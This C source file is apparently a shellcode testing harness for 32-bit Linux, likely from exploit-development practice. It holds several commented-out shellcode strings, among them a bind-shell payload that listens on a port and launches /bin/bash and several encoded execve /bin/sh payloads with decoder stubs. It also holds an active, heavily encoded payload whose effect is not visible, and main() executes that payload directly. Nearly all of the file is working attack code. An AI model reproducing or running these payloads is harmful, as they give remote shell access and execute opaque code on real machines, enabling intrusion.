#include <stdio.h>
#include <string.h>

//unsigned char shellcode[] ="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x00\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x83\xc4\x0c\x31\xd2\x89\xc2\x31\xc0\x31\xdb\xb3\x0e\xb0\x66\x31\xc9\x6a\x04\x54\x6a\x02\x6a\x01\x52\x89\xe1\xcd\x80\x31\xc0\x89\xd0\x83\xc4\x14\x31\xd2\x89\xc2\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x02\x83\xec\x08\x6a\x00\x66\x68\x2e\x2a\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x83\xc4\x1c\x89\xd0\x89\xc2\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x04\x6a\x02\x52\x89\xe1\xcd\x80\x83\xc4\x08\x31\xc0\x31\xdb\x31\xc9\x89\xd0\x89\xc2\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x51\x51\x52\x89\xe1\xcd\x80\x83\xc4\x0c\x31\xf6\x31\xff\x89\xc6\x89\xd7\x31\xc0\xb0\x66\x31\xdb\xb3\x0d\x89\xd1\xcd\x80\x31\xc0\xb0\x05\x89\xd3\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb0\x3f\x89\xf3\x51\x59\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x31\xc9\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x89\xc9\xb1\x02\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x01\xcd\x80";

//unsigned char shellcode[]="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x83\xc4\x0c\x31\xd2\x89\xc2\x31\xc0\x31\xdb\xb3\x0e\xb0\x66\x31\xc9\x6a\x04\x54\x6a\x02\x6a\x01\x52\x89\xe1\xcd\x80\x31\xc0\x89\xd0\x83\xc4\x14\x31\xd2\x89\xc2\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x02\x83\xec\x08\x51\x66\x68\x23\x28\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x83\xc4\x1c\x89\xd0\x89\xc2\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x04\x6a\x02\x52\x89\xe1\xcd\x80\x83\xc4\x08\x31\xc0\x31\xdb\x31\xc9\x89\xd0\x89\xc2\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x51\x51\x52\x89\xe1\xcd\x80\x83\xc4\x0c\x31\xf6\x31\xff\x89\xc6\x89\xd7\x31\xc0\xb0\x66\x31\xdb\xb3\x0d\x89\xd1\xcd\x80\x31\xc0\xb0\x05\x89\xd3\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb0\x3f\x89\xf3\x51\x59\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x31\xc9\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x89\xc9\xb1\x02\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x01\xcd\x80";

//unsigned char shellcode[]="\xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x87\xaa\xe3\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xbb";

//unsigned char shellcode[]="\xeb\x1d\x5e\xeb\x46\x5f\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x8a\x1c\x0e\x80\xfb\xbb\x74\x3a\x88\x1c\x17\x80\xc1\x02\x42\xeb\xef\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x87\xaa\xe3\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xe8\xb5\xff\xff\xe8\xb5\xff\xff\xff\xaa\xab\xac\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa";

//unsigned char shellcode[]="\xeb\x1d\x5e\xeb\x46\x5f\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x8a\x1c\x0e\x80\xfb\xbb\x74\x3a\x88\x1c\x17\x80\xc1\x02\x42\xeb\xef\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x87\xaa\xe3\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xe8\xb5\xff\xff\xe8\xb5\xff\xff\xff\xaa\xab\xac\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa";

//unsigned char shellcode[]="\xeb\x0c\x5e\x31\xc9\xb1\x19\xf6\x16\x46\xe2\xfb\xeb\x05\xe8\xef\xff\xff\xff\xce\x3f\xaf\x97\xd0\xd0\x8c\x97\x97\xd0\x9d\x96\x91\x78\x1c\x4f\xf4\x32\x7f";

//unsigned char shellcode[]="\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80";

//unsigned char shellcode[]="\xeb\x18\x5e\x31\xc0\x31\xc9\x31\xdb\x8a\x1e\x80\xf3\xbb\x74\x0f\x8a\x1e\x80\xf3\xaa\x88\x1e\x46\xeb\xef\xe8\xe3\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x2d\x49\x1a\xa1\x67\x2a\xbb";


unsigned char shellcode[] = 
"\xd9\xc8\xba\x6e\xe4\x52\x70\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x4a\x83\xc6\x04\x31\x56\x15\x03\x56\x15\x8c\x11\x8b\xb7\x89"
"\xae\x08\xcc\x73\xf1\xf0\xa6\x39\xf2\xc2\x7f\x8c\x4e\xa6\x42"
"\xea\x61\xda\x54\xf1\xf3\x0c\xbb\xa1\xc1\x5d\x4d\x5e\x86\xd6"
"\xfd\xae\x95\xaf\x46\x80\xb0\x68\x4b\xaf\x8a\x3c\xa2\xf5\x05"
"\x7a\x44\x24\x3b\xb0\x45\xbf\x51\xb9\x2f\x7c\x46\xab\xf3\xb2"
"\x42\xbf\xd3\x07\xd4\xf3\xeb\x2c\x26\xe9\xb4\x07\x3b\x71\x97"
"\x84\xcb\x10\xcd\x05\xcc\xce\xa0\x23\x6a\x19\x94\x4f\x48\x2c"
"\x9c\x55\x6a\x80\xf1\xf0\x40\x09\xe6\x01\xed\xb5\x64\xdb\xec"
"\xe3\x2c\x36\xda\x77\x2d\x8a\x42\xcf\xa1\x69\xbd\xee\x61\xca"
"\x12\x9f\xd3\xff\x03\x74\x18\xb6\x6f\x3d\xad\x8f\x2d\x00\x53"
"\xb6\x9f\xf2\x2c\x58\xbb\xae\x7a\xb3\x6a\x60\x4e\xac\x14\x79"
"\x62\x06\x5f\x21\xf8\x6a\x5f\x80\xd1\x24\xb5\xda\xeb\xeb\x88"
"\x8a\xa0\xf4\x3d\x57\x6b\x91\x4a\x51\x63\xff\xd3\x0d\x8c\xed"
"\x9b\x35\x8c\xdd\xe7\x1e\x5e\x81\xad\xa7\xf3\x7c\x8e\xd3\x93"
"\x55\xe4\x9a\xa1\x15\xaa\x06\xad\x50\xf4\x9e\x79\x61\xd1\xf3"
"\xbe\xe6\xda\xc8\x2f\xf3\x9e\x43\x63\x9d\xd0\x1d\x8b\xe6\xfd"
"\x38\x36\x82\xe2\x35\x5c\x59\x88\xd4\x02\xb5\x42\x95\xf6\x32"
"\x75\xd1\x26\xd0\x1b\x45\x84\x75\x2d\x8e\xeb\x2f\xca\x48\x78"
"\x77\x58\x97\x57\xcb\x99\xb4\x47\x6c\xd6\x0a\x39\xb5\xe9\x38"
"\x72\x5e\x68\x07\x17\xb9\x67\xbc\xc9\xdd\x57\xeb\x51\x9c\xd3"
"\x50\x5b\x0c\xd9\xf4\xe7";
int main()
{
    printf("Shellcode size: %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}
